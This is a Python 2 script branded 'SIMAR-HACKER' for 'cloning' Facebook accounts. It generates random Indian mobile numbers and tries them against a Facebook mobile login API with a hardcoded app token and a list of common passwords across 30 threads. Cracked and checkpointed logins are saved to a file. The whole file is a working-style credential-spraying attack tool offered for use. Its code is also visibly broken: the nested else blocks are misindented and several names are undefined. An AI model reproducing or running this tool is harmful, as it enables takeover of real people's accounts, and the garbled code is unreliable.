#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss404')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

                     
\033[1;94mFACEBOOK  SIMARHACKER
                  
\033[1;92mFB PAGE   SIMARHACKER

"""

####Logo####

logo1 = """
  

░██████╗██╗███╗░░░███╗░█████╗░██████╗░
██╔════╝██║████╗░████║██╔══██╗██╔══██╗
╚█████╗░██║██╔████╔██║███████║██████╔╝
░╚═══██╗██║██║╚██╔╝██║██╔══██║██╔══██╗
██████╔╝██║██║░╚═╝░██║██║░░██║██║░░██║
╚═════╝░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
 

██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
                                                                                      
                                                  

╔══──────────────────────────╗─══╗
║ OWNER 💓💓💓 SIMAR-HACKER       ║   ║
║ GITHUB 💝💝💝 SIMAR (CLONER)    ║   ║
║ FACEBOOK 💝💝💝 MR. SAUL HACKER ║   ║
║ ENJOY 💝💝💝 INDIA CLONEING     ║   ║
║ Note 💝💝💝 Use Fastest NeTWk   ║   ║
╚══──────────────────────────╝─══╝

"""
logo2 = """

░██████╗██╗███╗░░░███╗░█████╗░██████╗░
██╔════╝██║████╗░████║██╔══██╗██╔══██╗
╚█████╗░██║██╔████╔██║███████║██████╔╝
░╚═══██╗██║██║╚██╔╝██║██╔══██║██╔══██╗
██████╔╝██║██║░╚═╝░██║██║░░██║██║░░██║
╚═════╝░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
 

██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
                                                            
                                                   
                         DON'T COPY MY SCRIPT
                              SIMAR-HACKER          
                         MR. SAUL HACKER (SBA)
╔══──────────────────────────╗─══╗
║ OWNER 💓💓💓 SIMAR-HACKER       ║   ║
║ GITHUB 💝💝💝 SIMAR (CLONER)    ║   ║
║ FACEBOOK 💝💝💝 MR. SAUL HACKER ║   ║
║ ENJOY 💝💝💝 INDIA CLONEING     ║   ║
║ Note 💝💝💝 Use Fastest NeTWk   ║   ║
╚══──────────────────────────╝─══╝
"""
print("""
Owner: SIMAR-HACKER (SBA)
Facebook: MR. SAUL HACKER

""")
CorrectUsername = "SIMAR"
CorrectPassword = "SIMMU"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m\x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m \x1b[1;91mTool Password  \x1b[1;97m» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username 
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-https://wa.me/+923188214452')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-https://wa.me/+923188214452')


numm = [5,2,5,2,2]
##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;93m[1]\x1b[1;91m══START ( \033[1;92m )"
    time.sleep(0.05)
    print "\033[1;95m[2]\x1b[1;96m ══EXIT "
    time.sleep(0.05)
    print '\x1b[1;94m[0]\033[1;91m ══BACK '
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95m ══CHOOSE : \033[1;93m")
    if peak =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;93m[1] ══START CLONING  '
    time.sleep(0.10)
    print '\x1b[1;92m[2] ══EXIT'
    time.sleep(0.10)
    print '\x1b[1;95m[0] ══BACK '
    time.sleep(0.10)
    print '\x1b[1;96m ════SIMMU-HACKER'
    time.sleep(0.10)
    print '\x1b[1;97m════SIMAR-AMERICAN'
    time.sleep(0.10)
    print '\x1b[1;91m ════DONT COPY MY SCRIPT'
    time.sleep(0.10)
    print '\x1b[1;94m════CP ID OPEN AFTER 3 DAYS ENJOY'
   
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;97m ══CHOOSE:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "\033[1;94mEnter any Indian Mobile code Number"+'\n'
        print '\033[1;92mEnter any code 01 02 03 04 05 06 07 08 10 11 12 13 14 15 16 20 21 22 23 24 30 31 32 33 34 35 36 40 41 42 43 44 45 46 47 48 49'
        for i in numm:
            print('x' * i)
        try:
            c = raw_input("\033[1;97mCHOOSE : ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan ('\033[1;91m Total ids Accounts: '+xxx)
    jalan ('\033[1;92mSim code you choose: '+c)
    jalan ("\033[1;93mWait  Start Cracking...")
    jalan ("\033[1;94mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;97m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + nama + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="India123"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="jaan143"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="jannu143"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                             else:
                                            pass6="jannu14345"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass6
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass6+'\n')
                                                okb.close()
                                                oks.append(c+user+pass6)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass6 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass6+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass6)
                                                    else:
                                            pass7="12345a"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass7
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass7+'\n')
                                                okb.close()
                                                oks.append(c+user+pass7)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass7 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass7+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass7)
                                                    else:
                                            pass8="12341234"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass8
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass8+'\n')
                                                okb.close()
                                                oks.append(c+user+pass8)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass8 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass8+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass8)
                                                    else:
                                            pass9="abcd123"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass9
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass9+'\n')
                                                okb.close()
                                                oks.append(c+user+pass9)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass9 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass9+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass9)
                                                    else:
                                            pass10="2000"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass10
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass10+'\n')
                                                okb.close()
                                                oks.append(c+user+pass10)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass10 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass10+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass10)
                                                    else:
                                            pass11="20102010"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass11
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass11+'\n')
                                                okb.close()
                                                oks.append(c+user+pass11)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass11 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass11+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass11)
                                                    else:
                                            pass12="jan2000"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass12
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass12+'\n')
                                                okb.close()
                                                oks.append(c+user+pass12)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass12 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass12+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass12)
                                                    else:
                                            pass13="1jan2001"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass13
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass13+'\n')
                                                okb.close()
                                                oks.append(c+user+pass13)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass13 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass13+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass13)
                                                    else:
                                            pass14="01jan2002"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass14
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass14+'\n')
                                                okb.close()
                                                oks.append(c+user+pass14)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass14 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass14+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass14)
                                                    else:
                                            pass15="January1999"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[SIMMU-OK]  ' + k + c + user + '  |  ' + pass15
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass15+'\n')
                                                okb.close()
                                                oks.append(c+user+pass15)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[SIMMU-CP] ' + k + c + user + '  |  ' + pass15 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass15+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass15)                                                                                                                                                                   
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total CP/Ok: '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 10 to 20 days")
    print ''
    print """



\033[1;96mThanks For Using My tool
\033[1;95mFb\033[1;97mSIMAR-HACKER"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()
